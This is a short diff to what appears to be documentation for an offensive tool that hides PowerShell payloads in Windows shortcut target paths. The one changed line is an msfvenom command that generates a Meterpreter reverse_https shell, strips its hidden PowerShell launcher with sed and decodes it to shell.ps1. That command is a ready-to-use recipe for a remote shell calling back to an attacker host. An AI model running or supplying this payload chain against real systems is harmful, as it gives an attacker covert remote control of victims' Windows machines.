@@ -9,7 +9,7 @@ Note: The **TargetPath** has a limit of 260 characters long
 If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1
 ```
 
 `$ cat pwsh_cmds.txt`
